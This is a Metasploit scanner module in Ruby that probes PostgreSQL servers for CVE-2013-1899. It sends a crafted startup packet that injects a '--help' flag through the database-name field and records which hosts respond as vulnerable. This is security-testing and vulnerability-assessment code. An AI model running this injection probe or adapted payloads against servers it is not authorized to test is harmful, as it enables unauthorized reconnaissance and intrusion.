##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  # Creates an instance of this module.
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PostgreSQL Database Name Command Line Flag Injection',
      'Description'    => %q{
        This module can identify PostgreSQL 9.0, 9.1, and 9.2 servers that are
        vulnerable to command-line flag injection through CVE-2013-1899. This
        can lead to denial of service, privilege escalation, or even arbitrary
        code execution.
      },
      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2013-1899' ],
          [ 'URL', 'http://www.postgresql.org/support/security/faq/2013-04-04/' ]
        ]
    ))

    register_options([ Opt::RPORT(5432) ], self.class)
  end

  def run_host(ip)

    request =
      "\x00\x03\x00\x00" +
      "user\x00" +
      Rex::Text.rand_text_alpha(rand(4)+4) + "\x00" +
      "database\x00" +
      "--help\x00" +
      "application_name\x00" +
      Rex::Text.rand_text_alpha(rand(4)+4) + "\x00\x00"

    connect

    probe = [request.length + 4].pack("N") + request

    sock.put(probe)
    resp = sock.get_once(-1, 5)

    if resp.to_s =~ /process_postgres_switches/
      proof = resp[4, resp.length-4].to_s.gsub("\x00", " ")

      print_good("#{rhost}:#{rport} is vulnerable to CVE-2013-1899: #{proof}")
      report_vuln({
        :host	=> rhost,
        :port	=> rport,
        :proto  => 'tcp',
        :sname  => 'postgres',
        :name	=> self.name,
        :info	=> "Vulnerable: " + proof,
        :refs   => self.references
      })
    elsif resp.to_s =~ /pg_hba\.conf/
      print_error("#{rhost}:#{rport} does not allow connections from us")
    else
      print_status("#{rhost}:#{rport} does not appear to be vulnerable to CVE-2013-1899")
    end
  end

end
